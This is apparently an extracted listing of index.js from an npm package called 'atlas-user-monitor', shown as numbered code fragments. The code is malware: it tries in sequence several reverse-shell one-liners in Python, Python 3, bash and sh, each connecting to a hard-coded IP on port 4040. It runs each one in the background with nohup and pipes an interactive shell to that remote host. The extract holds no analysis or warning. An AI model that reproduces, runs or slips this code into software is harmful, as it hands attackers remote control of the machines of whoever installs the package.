// File: tmp/tmpk17fiyb9/atlas-user-monitor/package/index.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const net = require('net')
Line 7: const client = new net.Socket()
Line 9: {
    // Try different shell commands
    const commands = [
        'nohup python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.61.80.228",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' > /dev/null 2>&1 &',
        'nohup python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.61.80.228",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' > /dev/null 2>&1 &',
        'nohup bash -i >& /dev/tcp/154.61.80.228/4040 0>&1 > /dev/null 2>&1 &',
        'nohup sh -i >& /dev/tcp/154.61.80.228/4040 0>&1 > /dev/null 2>&1 &'
    ];

    let commandIndex = 0;

    function tryCommand() {
        if (commandIndex >= commands.length) {
            return;
        }

        const command = commands[commandIndex];
        const sh = exec(command, (error, stdout, stde...
Line 11: const commands = [
        'nohup python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.61.80.228",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' > /dev/null 2>&1 &',
        'nohup python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.61.80.228",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' > /dev/null 2>&1 &',
        'nohup bash -i >& /dev/tcp/154.61.80.228/4040 0>&1 > /dev/null 2>&1 &',
        'nohup sh -i >& /dev/tcp/154.61.80.228/4040 0>&1 > /dev/null 2>&1 &'
    ]
Line 12: _tmp_4.push("nohup python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.61.80.228",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /dev/null 2>&1 &")
Line 13: _tmp_4.push("nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("154.61.80.228",4040));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /dev/null 2>&1 &")
Line 14: _tmp_4.push("nohup bash -i >& /dev/tcp/154.61.80.228/4040 0>&1 > /dev/null 2>&1 &")
Line 15: _tmp_4.push("nohup sh -i >& /dev/tcp/154.61.80.228/4040 0>&1 > /dev/null 2>&1 &")
Line 20: {
        if (commandIndex >= commands.length) {
            return;
        }

        const command = commands[commandIndex];
        const sh = exec(command, (error, stdout, stderr) => {
            if (error) {
                commandIndex++;
                tryCommand();
                return;
            }
        });

        client.write('Connected to the target IP and port\n');

        sh.stdout.pipe(client);
        sh.stderr.pipe(client);

        client.pipe(sh.stdin);
    }
Line 25: const command = commands[commandIndex]
Line 26: const sh = exec(command, (error, stdout, stderr) => {
            if (error) {
                commandIndex++;
                tryCommand();
                return;
            }
        })
Line 34: client.write('Connected to the target IP and port\n')
Line 36: sh.stdout.pipe(client)
Line 37: sh.stderr.pipe(client)
Line 39: client.pipe(sh.stdin)
